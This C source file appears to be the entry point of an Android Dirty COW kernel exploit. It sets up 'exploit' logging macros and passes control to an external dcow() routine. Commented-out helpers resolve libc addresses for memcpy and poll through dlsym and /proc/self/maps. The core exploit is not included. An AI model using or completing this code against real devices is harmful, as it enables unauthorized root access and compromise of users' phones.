#include <err.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>

#ifdef DEBUG
#include <android/log.h>
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#elif PRINT
#define LOGV(...) { __android_log_print(ANDROID_LOG_INFO, "exploit", __VA_ARGS__); printf(__VA_ARGS__); printf("\n"); fflush(stdout); }
#else
#define LOGV(...)
#endif


extern int dcow(int argc, const char *argv[]);

/*static void* get_function_addr(const char * libname, const char * symbol)*/
/*{*/
	/*void * handle;*/
  /*void * addr;*/
	/*const char *error;*/

	/*dlerror();*/

	/*handle = dlopen(libname, RTLD_LAZY);*/
	/*if (handle == NULL) {*/
		/*LOGV("%s", dlerror());*/
		/*return 0;*/
	/*}*/

	/*addr = (unsigned long)dlsym(handle, symbol);*/
	/*error = dlerror();*/
	/*if (error != NULL) {*/
		/*LOGV("%s", error);*/
		/*return 0;*/
	/*}*/

	/*Dl_info dlinfo;*/
	/*if (dladdr(addr, &dlinfo) == 0) {*/
		/*error = dlerror();*/
		/*LOGV("dladdr failed %s", error);*/
		/*dlclose(handle);*/
		/*return 0;*/
	/*}*/

	/*dlclose(handle);*/

	/*LOGV("fbase %p saddr %p",dlinfo.dli_fbase, dlinfo.dli_saddr);*/
	/*void * fileaddr = (dlinfo.dli_saddr - dlinfo.dli_fbase);*/
	/*LOGV("addr %p", fileaddr);*/

	/*return fileaddr;*/
/*}*/

/*static int get_range(const char * library, unsigned long *start, unsigned long *end)*/
/*{*/
	/*char line[4096];*/
	/*FILE *fp;*/

	/*fp = fopen("/proc/self/maps", "r");*/
	/*if (fp == NULL)*/
		/*LOGV("fopen(\"/proc/self/maps\")");*/

	/*while (fgets(line, sizeof(line), fp) != NULL) {*/
		/*if (strstr(line, library) == NULL)*/
			/*continue;*/

		/*if (strstr(line, "r-xp") == NULL)*/
			/*continue;*/

		/**start = strtoul(line, NULL, 16);*/
		/**end = strtoul(line+9, NULL, 16);*/
		/*fclose(fp);*/
		/*return 0;*/
	/*}*/

	/*fclose(fp);*/

	/*return -1;*/
/*}*/


int main(int argc, const char *argv[])
{
	/*const char* library = "/system/lib/libc.so";*/
	/*const char* function = "memcpy";*/
	/*const char* libname = strrchr(library, '/');*/
	/*if (libname == 0) {*/
		/*libname = library;*/
	/*} else {*/
		/*libname++;*/
	/*}*/

	/*LOGV("[*] function: %s library: %s libname: %s", function, library, libname);*/

	/*void * function_addr = get_function_addr(libname, function);*/
	/*LOGV("[*] %s addr: %p", function, function_addr);*/

	/*void * poll_addr = get_function_addr(libname, "poll");*/
	/*LOGV("[*] %s addr: %p", function, poll_addr);*/

	/*unsigned long start, end;*/
	/*int range = get_range(library, &start, &end);*/
	/*if (range != 0) {*/
		/*LOGV("failed to get range");*/
	/*}*/
	/*LOGV("%lx = %lx - %lx", (function_addr - start), function_addr, start);*/

	return dcow(argc, argv);
}